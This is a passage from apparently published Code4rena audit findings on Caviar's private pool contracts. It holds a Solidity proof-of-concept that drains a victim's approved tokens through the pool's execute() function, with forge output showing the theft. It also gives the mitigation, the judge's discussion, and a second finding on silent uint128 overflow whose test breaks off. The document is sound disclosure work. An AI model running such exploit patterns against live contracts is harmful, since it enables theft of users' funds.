class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSelector</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\">.</span><span class=\"mtk12\">transferFrom</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">victim</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">hacker</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">victim</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">execute</span><span class=\"mtk1\">(</span><span class=\"mtk12\">target</span><span class=\"mtk1\">, </span><span class=\"mtk12\">data</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;token balance of victim  after hack&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">victim</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>We run the POC, the output is:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">PS</span><span class=\"mtk1\"> D:\\2023</span><span class=\"mtk12\">Security</span><span class=\"mtk1\">\\</span><span class=\"mtk7\">2023</span><span class=\"mtk1\">-</span><span class=\"mtk7\">04</span><span class=\"mtk1\">-</span><span class=\"mtk12\">caviar</span><span class=\"mtk1\">&gt; </span><span class=\"mtk12\">forge</span><span class=\"mtk1\"> </span><span class=\"mtk12\">test</span><span class=\"mtk1\"> -</span><span class=\"mtk12\">vv</span><span class=\"mtk1\"> --</span><span class=\"mtk12\">match</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;testStealFundArbitrary_POC&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[⠒] </span><span class=\"mtk12\">Compiling</span><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[⠑] </span><span class=\"mtk12\">Compiling</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">files</span><span class=\"mtk1\"> </span><span class=\"mtk15\">with</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">19</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[⠃] </span><span class=\"mtk12\">Solc</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">19</span><span class=\"mtk1\"> </span><span class=\"mtk12\">finished</span><span class=\"mtk1\"> </span><span class=\"mtk4\">in</span><span class=\"mtk1\"> 8.09</span><span class=\"mtk12\">s</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">Compiler</span><span class=\"mtk1\"> </span><span class=\"mtk12\">run</span><span class=\"mtk1\"> </span><span class=\"mtk12\">successful</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">Running</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">test</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">test</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Execute</span><span class=\"mtk1\">.</span><span class=\"mtk12\">t</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk12\">ExecuteTest</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[</span><span class=\"mtk12\">PASS</span><span class=\"mtk1\">] </span><span class=\"mtk11\">testStealFundArbitrary_POC</span><span class=\"mtk1\">() (</span><span class=\"mtk12\">gas</span><span class=\"mtk1\">: </span><span class=\"mtk7\">753699</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">Logs:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  token balance of victim before hack 100000000000000000000000</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  token balance of victim  after hack 0</span></span></span></code></pre>\n<p>As we can see, the victim’s ERC20 token are stolen.</p>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We recommend the protocol not let the private pool owner perform arbtirary execution. The private pool can use the flashloan to claim the airdrop himself.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/184#issuecomment-1519844839\">outdoteth (Caviar) confirmed and mitigated</a>:</strong></p>\n<blockquote>\n<p>Fixed in: <a href=\"https://github.com/outdoteth/caviar-private-pools/pull/2\">https://github.com/outdoteth/caviar-private-pools/pull/2</a></p>\n<p>The proposed fix is to revert if execute tries to call the <code>baseToken</code> or <code>nft</code> contract. It’s very unlikely a user will approve any other token than these to the pool so this serves as a sufficient check to prevent the stealing outlined in the exploit.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">target</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">) || </span><span class=\"mtk12\">target</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidTarget</span><span class=\"mtk1\">();</span></span></span></code></pre>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/184#issuecomment-1525196191\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>@outdoteth - Wouldn’t the owner be the one owning all of the deposited assets anyway?</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/184#issuecomment-1525531130\">outdoteth (Caviar) commented</a>:</strong></p>\n<blockquote>\n<p>@GalloDaSballo - The exploit is not about the owner having ownership over owned deposits but rather about stealing non-deposited user funds.</p>\n<p>For example,</p>\n<ul>\n<li>Alice wants to sell her Milady 123. She also holds Milady 555 and 111.</li>\n<li>She approves the PrivatePool to spend all of her Miladies so that she can subsequently call “sell()”</li>\n<li>The malicious owner of the pool then calls “execute()” multiple times with a payload that calls the Milady contract and <code>transferFrom</code> to transfer all of her Miladies (123, 555, 111) from her wallet</li>\n</ul>\n<p>Alice has now lost all of her Miladies. The same also applies to baseToken approvals when Alice wants to buy some NFTs.</p>\n<p>The proposed fix is to prevent <code>execute()</code> from being able to call the <code>baseToken</code> or <code>nft</code> contracts so that the above example can never occur.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/184#issuecomment-1528976654\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Thank you @outdoteth for clarifying.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/184#issuecomment-1528977331\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how, because of the<code>setApprovalForAll</code> pattern, mixed with the <code>execute</code> function, a <code>PrivatePool</code> may be used to harvest approvals from users, causing them to lose all tokens.</p>\n<p>I have considered downgrading the finding because of the Router technically providing a safety check against the pool.</p>\n<p>However, I believe that the risky pattern of direct approvals to the pool is demonstrated by the pull transfer performed by the FlashLoan function:\n<a href=\"https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L648-L649\">https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L648-L649</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>For that call to work, the user / user-contract will have to have approved the pool directly.</p>\n<p>For this reason I agree with High Severity.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-03-risk-of-silent-overflow-in-reserves-update\" style=\"position:relative;\"><a href=\"#h-03-risk-of-silent-overflow-in-reserves-update\" aria-label=\"h 03 risk of silent overflow in reserves update permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/167\">[H-03] Risk of silent overflow in reserves update</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/167\">sashik_eth</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/1009\">codeslide</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/1008\">Kaysoft</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/1007\">W0RR1O</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/1006\">georgits</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/1005\">btk</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/1004\">lukris02</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/1003\">0x6980</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/1002\">tnevler</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/1001\">0xAgro</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/1000\">matrix_0wl</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/999\">catellatech</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/998\">Sathish9098</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/997\">ayden</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/995\">0x4non</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/987\">adriro</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/978\">Madalad</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/846\">Kenshin</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/779\">giovannidisiena</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/744\">devscrooge</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/653\">sayan</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/644\">SaeedAlipoor01988</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/625\">tsvetanovv</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/537\">Cryptor</a>, and <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/483\">matrix_0wl</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L230-L231\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L230-L231</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L323-L324\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L323-L324</a></p>\n<h3 id=\"vulnerability-details\" style=\"position:relative;\"><a href=\"#vulnerability-details\" aria-label=\"vulnerability details permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability details</h3>\n<p>The <a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L211\"><code>buy()</code></a> and <a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L301\"><code>sell()</code></a> functions update the <code>virtualBaseTokenReserves</code> and <code>virtualNftReserves</code> variables during each trade. However, these two variables are of type <code>uint128</code>, while the values that update them are of type <code>uint256</code>. This means that casting to a lower type is necessary, but this casting is performed without first checking that the values being cast can fit into the lower type. As a result, there is a risk of a silent overflow occurring during the casting process.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">buy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenWeights</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MerkleMultiProof</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proof</span><span class=\"mtk1\">) </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">payable</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">netInputAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ~~~ Checks ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// calculate the sum of weights of the NFTs to buy</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weightSum</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">sumWeightsAndValidateProof</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenWeights</span><span class=\"mtk1\">, </span><span class=\"mtk12\">proof</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// calculate the required net input amount and fee amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">netInputAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">buyQuote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">weightSum</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// update the virtual reserves</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">virtualBaseTokenReserves</span><span class=\"mtk1\"> += </span><span class=\"mtk11\">uint128</span><span class=\"mtk1\">(</span><span class=\"mtk12\">netInputAmount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\">); </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">virtualNftReserves</span><span class=\"mtk1\"> -= </span><span class=\"mtk11\">uint128</span><span class=\"mtk1\">(</span><span class=\"mtk12\">weightSum</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span></code></pre>\n<h3 id=\"impact-1\" style=\"position:relative;\"><a href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>If the reserves variables are updated with a silent overflow, it can lead to a breakdown of the xy=k equation. This, in turn, would result in a totally incorrect price calculation, causing potential financial losses for users or pool owners.</p>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Consider the scenario with a base token that has high decimals number described in the next test (add it to the <code>test/PrivatePool/Buy.t.sol</code>):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_Overflow</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Setting up pool and base token HDT with high decimals number - 30</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Initial balance of pool - 10 NFT and 100_000_000 HDT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">HighDecimalsToken</span><span class=\"mtk1\"> </span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">HighDecimalsToken</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">PrivatePool</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">factory</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">royaltyRegistry</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stolenNftOracle</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">initialize</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">nft</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">100_000_000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e30</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">changeFee</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">feeRate</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">merkleRoot</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">true</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">false</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Minting NFT on pool address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">100</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">110</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">milady</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">), </span><span class=\"mtk12\">i</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Adding 8 NFT ids into the buying array</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">100</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">108</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk11\">push</span><span 